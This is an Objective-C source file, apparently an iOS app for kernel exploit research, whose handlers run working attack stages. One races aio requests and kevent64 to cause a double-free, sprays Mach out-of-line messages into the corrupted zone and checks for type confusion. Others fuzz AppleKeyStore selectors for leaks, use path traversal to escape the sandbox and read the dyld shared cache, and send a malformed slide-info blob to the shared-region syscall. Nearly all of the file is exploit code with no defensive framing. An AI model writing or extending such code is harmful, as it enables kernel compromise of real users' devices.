...
- (void)setupUI {
    ...
    [self.v81Button setTitle:@"AIO v82 (spray AFTER df)" forState:UIControlStateNormal];
    ...
    self.aksProbeButton = [UIButton buttonWithType:UIButtonTypeSystem];
    self.aksProbeButton.translatesAutoresizingMaskIntoConstraints = NO;
...
// =======================================================================
// v82: OOL spray AFTER double-free corrupts zone freelist.
// v79 trigger → kevent64 double-free → cleanup (triple-free) → close kq
// → THEN spray OOL into corrupted zone → aio_read to detect overlap.
// =======================================================================

#define V82_OOL_COUNT 128
#define V82_OOL_SIZE  256
#define V82_PROBE_COUNT 16

- (void)aioUafV81Tapped {
    static volatile int32_t _v81Running = 0;
    if (!__sync_bool_compare_and_swap(&_v81Running, 0, 1)) {
        [self appendLog:@"v82 already running"]; return;
    }
    @synchronized([ViewController class]) {
        static int64_t _v82Last = 0;
        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
        if (now - _v82Last < 3000) { _v81Running = 0; [self appendLog:@"Debounced"]; return; }
        _v82Last = now;
    }

    [self appendLog:@"\n========== AIO UAF v82 (Spray AFTER double-free) =========="];
    ...
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ...
        // ---- Phase A: v79 exact trigger (proven) ----
        NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@"aio_v82.bin"];
        int fd = open(path.UTF8String, O_CREAT | O_RDWR | O_TRUNC, 0644);
        if (fd < 0) {
            [self appendLog:@"FAIL: open"];
            _v81Running = 0;
            dispatch_async(dispatch_get_main_queue(), ^{
        ...
        memset(fdata, 'A', sizeof(fdata));
        write(fd, fdata, sizeof(fdata));
        [self appendLog:[NSString stringWithFormat:@"fd=%d pid=%d", fd, getpid()]];

        bool doubleFreeOk = false;
        for (int attempt = 0; attempt < 10; attempt++) {
            [self appendLog:[NSString stringWithFormat:@"  v79 trigger attempt %d/10", attempt + 1]];
            ...
            if (atomic_load(&rs.freed) == 0 || !atomic_load(&rs.reclaim_done)) {
                while (aio_error(&tcb) == EINPROGRESS) usleep(500);
                aio_return(&tcb);
                close(kq);
                [self appendLog:@"  race lost"];
                continue;
            }
            ...
            // kevent64 → double-free
            struct kevent64_s kev = {};
            struct timespec ts = {10, 0};
            int nev = kevent64(kq, NULL, 0, &kev, 1, 0, &ts);
            if (nev <= 0) {
                [self appendLog:[NSString stringWithFormat:@"  kevent64 timeout (%d)", nev]];
                for (int i = 0; i < V79_NRECLAIM; i++) {
            ...
            [self appendLog:[NSString stringWithFormat:@"  double-free OK (ext[0]=0x%llx ext[1]=0x%llx)", kev.ext[0], kev.ext[1]]];

            // ---- Cleanup → triple-free + filt_aiodetach unref → zone freelist corrupted ----
            for (int i = 0; i < V79_NRECLAIM; i++) {
                if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
            }
            close(kq);  // filt_aiodetach → another unref on stale knote
            doubleFreeOk = true;
            break;
        }

        if (!doubleFreeOk) {
            [self appendLog:@"FAIL: couldn't trigger double-free"];
            close(fd); unlink(path.UTF8String);
            _v81Running = 0;
            dispatch_async(dispatch_get_main_queue(), ^{
                self.v81Button.enabled = YES;
                [self.v81Button setTitle:@"AIO v82 (spray AFTER df)" forState:UIControlStateNormal];
        ...
        // ---- Phase B: Spray OOL into corrupted zone ----
        [self appendLog:[NSString stringWithFormat:@"\n--- Phase B: Spray %d OOL into corrupted zone ---", V82_OOL_COUNT]];

        uint8_t sprayData[V82_OOL_SIZE];
        memset(sprayData, 0, V82_OOL_SIZE);
        // Fill with pattern: offset-as-value so any leak is identifiable
        for (int i = 0; i < V82_OOL_SIZE / 8; i++)
            *(uint64_t *)(sprayData + i * 8) = 0xE0000000 + i * 8;
        ...
        for (int i = 0; i < V82_OOL_COUNT; i++) {
            OolMsg msg;
            memset(&msg, 0, sizeof(msg));
            msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
            msg.header.msgh_size = sizeof(msg);
            msg.header.msgh_remote_port = sprayPort;
            msg.header.msgh_id = 0xE200 + i;
            msg.body.msgh_descriptor_count = 1;
            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
            msg.ool.address = sprayData;
            msg.ool.size = V82_OOL_SIZE;
            msg.ool.deallocate = FALSE;
            msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
            if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0,
                         MACH_PORT_NULL, 0, MACH_PORT_NULL) != MACH_MSG_SUCCESS) {
                if (i == 0) { [self appendLog:@"  OOL send failed"]; break; }
            }
        }
        [self appendLog:[NSString stringWithFormat:@"  %d OOL messages sent", V82_OOL_COUNT]];

        // ---- Phase C: Probe — aio_read on corrupted zone, check for overlap via kevent ----
        [self appendLog:@"\n--- Phase C: Probe aio_read on corrupted zone ---"];

        int kq2 = kqueue();
        if (kq2 < 0) {
            [self appendLog:@"kqueue2 failed"];
        } else {
            int overlapDetected = 0;
            for (int i = 0; i < V82_PROBE_COUNT; i++) {
                struct aiocb probe;
                char probeBuf[4096];
                memset(&probe, 0, sizeof(probe));
                probe.aio_fildes = fd;
                probe.aio_buf = probeBuf;
                probe.aio_nbytes = 4096;
                probe.aio_offset = 0;
                probe.aio_lio_opcode = LIO_READ;
                probe.aio_sigevent.sigev_notify = SIGEV_KEVENT;
                probe.aio_sigevent.sigev_signo = kq2;
                probe.aio_sigevent.sigev_value.sival_ptr = (void *)(uintptr_t)(0xE300 + i);

                if (aio_read(&probe) != 0) continue;
                while (aio_error(&probe) == EINPROGRESS) usleep(500);
                ...
                if (nev2 > 0) {
                    uint64_t ext1 = kev2.ext[1];
                    if (ext1 != 0x1000 && ext1 != 0) {
                        [self appendLog:[NSString stringWithFormat:@"  *** probe[%d] ANOMALY: ext[0]=0x%llx ext[1]=0x%llx (expected 0x1000) ***",
                            i, kev2.ext[0], ext1]];
                        overlapDetected++;
                    }
                    aio_return(&probe);
            ...
            close(kq2);
            [self appendLog:[NSString stringWithFormat:@"  overlap probes: %d/%d anomalous", overlapDetected, V82_PROBE_COUNT]];
            if (overlapDetected > 0) {
                [self appendLog:@"  *** ZONE OVERLAP CONFIRMED — type confusion working! ***"];
            }
        }
        ...
        unlink(path.UTF8String);
        [self appendLog:[NSString stringWithFormat:@"=== uid=%d gid=%d ===", getuid(), getgid()]];
        [self appendLog:@"========== AIO UAF v82 Complete =========="];
...
- (void)aksProbeTapped {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ...
        [self appendLog:[NSString stringWithFormat:@"Opened conn=0x%x", conn]];

        NSMutableString *report = [NSMutableString string];
        int leakCount = 0;

        // Probe selectors 0-15 with output capture
        for (uint32_t sel = 0; sel < 16; sel++) {
            uint64_t input[6] = {1, 0, 0, 0x10, 0, 0};
            uint64_t output[8] = {0};
...
- (void)rieProbeTapped {
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        ...
        // ── Phase D-3: fd=-1 diagnostic — find correct params ──
        // Hypothesis: errno=4 (not EPERM) means fd=-1 path might work
        // without first-mapper status, but params are wrong
        [self appendLog:@"\n── Phase D-3: fd=-1 param diagnostic ──"];
        {
            // Resolve vm_region_recurse locally
            Rie_VMRegionRecurseFn vrr = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");

            // Allocate a clean page-aligned blob via vm_allocate for valid kernel copyin
            uint8_t *blob = NULL;
            vm_size_t blobSz = 0x4000;
            kern_return_t kr = vm_allocate(mach_task_self(), (vm_address_t*)&blob, blobSz, VM_FLAGS_ANYWHERE);
            if (kr == KERN_SUCCESS && blob) {
                memset(blob, 0, blobSz);
                *(uint32_t*)(blob) = 5;        // version 5
                *(uint32_t*)(blob+4) = 0x4000; // page_size (delta_mask=0 for probe)

                // Find the END of the last dyld region for a clean address
                rie_mach_vm_address_t cleanAddr = 0x1f9000000ULL; // default: high, past known regions
                if (vrr) {
                    ...
                    for (int ri = 0; ri < 128; ri++) {
                        ...
                        natural_t d = 1;
                        mach_msg_type_number_t cnt = sizeof(info)/sizeof(natural_t);
                        if (vrr(mach_task_self(), &w, &vs, &d,
                            (rie_vm_region_recurse_info_t)info, &cnt) != KERN_SUCCESS) break;
                        if (w > lastEnd) lastEnd = w + vs;
                        w += vs;
                        if (w >= 0x200000000ULL) break;
                    }
                    // Page-align past last mapped region
                    cleanAddr = (lastEnd + 0xFFF) & ~0xFFFULL;
                    if (cleanAddr < 0x1f9000000ULL) cleanAddr = 0x1f9000000ULL;
                    if (cleanAddr + 0x4000 > 0x200000000ULL) cleanAddr = 0x1ff000000ULL;
                }
                [self appendLog:[NSString stringWithFormat:@"  clean probe address: 0x%llx", (unsigned long long)cleanAddr]];

                #define T536D(nf,files,nm,maps,desc) do { \
                    errno = 0; \
                    long _r = sc(536, (long)(nf), (files), (long)(nm), (maps)); \
                    [self appendLog:[NSString stringWithFormat: \
                        @"  %-48s nf=%lld nm=%lld → ret=%ld errno=%d", \
                        desc, (long long)(nf), (long long)(nm), _r, errno]]; \
                } while(0)

                struct rie_sr_file tf_d3;
                struct rie_sr_mapping tm_d3;
                memset(&tf_d3, 0, sizeof(tf_d3));
                memset(&tm_d3, 0, sizeof(tm_d3));

                // Test 1: nf=1 fd=-1 nm=0 (baseline — should work)
                tf_d3.sf_fd = -1; tf_d3.sf_mappings_count = 0; tf_d3.sf_slide = 0;
                T536D(1, &tf_d3, 0, NULL, "1: fd=-1 mc=0 nm=0");

                // Test 2: nf=0 nm=1 at clean addr (establish mapping without files)
                tm_d3.sms_address = cleanAddr;
                tm_d3.sms_size = 0x4000;
                tm_d3.sms_max_prot = 5; tm_d3.sms_init_prot = 3;
                tm_d3.sms_file_offset = 0;
                tm_d3.sms_slide_size = 0; tm_d3.sms_slide_start = 0;
                T536D(0, NULL, 1, &tm_d3, "2: nf=0 nm=1 at clean addr");

                // Test 3: nf=1 fd=-1 nm=1 at clean addr (foff=blob VA)
                tf_d3.sf_fd = -1; tf_d3.sf_mappings_count = 1;
                tm_d3.sms_file_offset = (uint64_t)(uintptr_t)blob;
                T536D(1, &tf_d3, 1, &tm_d3, "3: fd=-1 nm=1 foff=blob");

                // Test 4: foff=0 (kernel copies from mapping addr itself?)
                tm_d3.sms_file_offset = 0;
                T536D(1, &tf_d3, 1, &tm_d3, "4: fd=-1 nm=1 foff=0");

                // Test 5: with slide-info at blob
                tm_d3.sms_slide_size = 64;
                tm_d3.sms_slide_start = (uint64_t)(uintptr_t)blob;
                T536D(1, &tf_d3, 1, &tm_d3, "5: fd=-1 nm=1 slide=64");

                // Test 6: foff=0 + slide
                tm_d3.sms_file_offset = 0;
                T536D(1, &tf_d3, 1, &tm_d3, "6: fd=-1 nm=1 foff=0 slide=64");

                // Test 7: Try with 8-byte file struct (no sf_slide field)
                // The real kernel struct might be just 8 bytes
                struct { int fd; uint32_t mc; } tf_short;
                tf_short.fd = -1; tf_short.mc = 1;
                tm_d3.sms_file_offset = 0;
                tm_d3.sms_slide_size = 0; tm_d3.sms_slide_start = 0;
                T536D(1, &tf_short, 1, &tm_d3, "7: 8B file struct (no slide)");
        ...
        // Scan ALL depth>=1 regions within the shared region. The main cache
        // header (first dyld_v1) only has NOSLIDE entries; the non-auth slide
        // carrier is in a subcache region.
        [self appendLog:@"\n── Phase E: scan SR regions for non-auth slide carrier ──"];
        ...
        if (!rie_vmRecurse2 || !rie_vmRead2) {
            ...
            // Outer-scope carrier data (filled when non-auth found in any region)
            int foundNA = -1;
            ...
            for (; segIdx < 80; segIdx++) {
                ...
                if (kr == KERN_SUCCESS && outSz >= 16 && memcmp(tryBuf, "dyld_v1", 7) == 0) {
                    ...
                    uint32_t mws_cnt = *(uint32_t*)(tryBuf + 0x13c);

                    // Read larger chunk for full MWS table
                        ...
                        if (rie_vmRead2(mach_task_self(), walk, RIE_FULL_SIZE,
                            ...
                            for (uint32_t mi = 0; mi < mws_cnt && mi < 10; mi++) {
                                ...
                                [self appendLog:[NSString stringWithFormat:@"  MWS[%u] a=0x%llx sz=0x%llx sl=0x%llx fl=0x%llx p=%x/%x %@",
                                    mi, a, sz, sl, fl, mp, ip,
                                    isSlide ? (isAuth ? @"AUTH" : @"<<< NONAUTH <<<") : @"NOSLIDE"]];
                                if (isSlide && !isAuth && foundNA < 0) {
                                    foundNA = (int)mi; naAddr=a; naSize=sz; naFoff=fo;
                                    naSlide=sl; naFlags=fl; naMax=mp; naInit=ip;
                                    naHdrAddr = walk;
                                    csOff = *(uint64_t*)(fullHdr + 0x028);
                                    csSz  = *(uint64_t*)(fullHdr + 0x030);
                                    [self appendLog:[NSString stringWithFormat:@"  *** NONAUTH SLIDE CARRIER FOUND at region %d! ***", segIdx]];
                                }
                            }
                        }
                        free(fullHdr);
                    ...
                    if (foundNA >= 0) { free(tryBuf); break; }  // found carrier, stop walk
                }
                free(tryBuf);
                #undef RIE_TRY_SIZE
                walk += segSize;
            ...
            if (foundNA < 0) {
                [self appendLog:[NSString stringWithFormat:@"!! no non-auth slide carrier found in %d regions", segIdx]];
            } else {
                [self appendLog:[NSString stringWithFormat:@"target: region=%d hdr=0x%llx MWS[%d] a=0x%llx sz=0x%llx foff=0x%llx slide=0x%llx flags=0x%llx max=%x init=%x codeSig=0x%llx+0x%llx",
                    segIdx, naHdrAddr, foundNA, naAddr, naSize, naFoff, naSlide, naFlags, naMax, naInit, csOff, csSz]];

                // Build slide-info v5 blob with OOB page_starts[2]=0xFFFE
                #define BLOB_PS 0x4000
                #define BLOB_PC 64
                size_t blobSz = 24 + BLOB_PC * 2;
                uint8_t *blob = (uint8_t *)calloc(1, blobSz);
                if (blob) {
                    uint32_t v5=5; uint64_t va=0; uint32_t bps=BLOB_PS, bpc=BLOB_PC;
                    memcpy(blob, &v5, 4); memcpy(blob+4, &bps, 4);
                    memcpy(blob+8, &bpc, 4); memcpy(blob+16, &va, 8);
                    uint16_t *ps = (uint16_t*)(blob+24);
                    for (uint32_t j=0; j<BLOB_PC; j++) ps[j]=0xFFFF;
                    ps[2]=0xFFFE;
                    [self appendLog:[NSString stringWithFormat:@"blob: ver=5 cnt=%u target[2]=0xFFFE total=%zu", BLOB_PC, blobSz]];

                    // Build sr_cfg (3-files, 3-mappings) per reference exploit layout
                    // Strategy: try to get real fds for cache files (header + subcache)
                    // 1) Probe disk paths via sandbox-bypass NSFileHandle
                    // 2) Fallback: read header from SR submap → temp file → open fd
                    #define CFG_SZ (sizeof(struct rie_sr_cfg) + 0x4000)
                    #define HDR_SZ 0x90000ULL   // TEXT header size from region 0
                    #define BLOB_SR (0x180000000ULL + HDR_SZ)  // blob page right after header
                    #define F_ADDFILESIGS_RETURN 97
                    void *cfg = mmap(NULL, CFG_SZ, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
                    if (cfg != MAP_FAILED) {
                        memset(cfg, 0, CFG_SZ);
                        struct rie_sr_cfg *c = (struct rie_sr_cfg *)cfg;
                        c->magic = RIE_SR_CFG_MAGIC; c->blob_off = 0x4000;
                        c->fault_addr = naAddr; c->blob_size = blobSz;

                        int fd_main = -1, fd_sub = -1;

                        // ── Try to open main cache (TEXT header) ──
                        // Step 1: disk paths via NSFileHandle with sandbox bypass
                        const char *cachePaths[] = {
                            "/System/Library/dyld/",
                            "/System/Cryptexes/OS/System/Library/dyld/",
                            "/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/",
                        };
                        const char *cacheFile = "dyld_shared_cache_arm64e";
                        for (int pi = 0; pi < 3 && fd_main < 0; pi++) {
                            char raw[1024];
                            snprintf(raw, sizeof(raw), "%s%s%s", "../../../../../../../../../../../../../", cachePaths[pi], cacheFile);
                            ...
                            if (fh) {
                                ...
                                [fh closeFile];
                                [self appendLog:[NSString stringWithFormat:@"main cache OPEN disk[%d]: %@ fd=%d", pi, nsp, fd_main]];
                                ...
                                [self appendLog:[NSString stringWithFormat:@"F_ADDFILESIGS(fd_main=%d) rc=%d", fd_main, rc]];
                            }
                        }
                        ...
                        [self appendLog:[NSString stringWithFormat:@"syscall(536): ret=%ld errno=%d", r, errno]];
                        if (fd_main >= 0) close(fd_main);
                        if (fd_sub >= 0) close(fd_sub);
                        munmap(cfg, CFG_SZ);
                    }
                    #undef HDR_SZ
                    #undef BLOB_SR
                    #undef CFG_SZ
                    #undef F_ADDFILESIGS_RETURN
                    free(blob);
                }
                #undef BLOB_PS
                #undef BLOB_PC
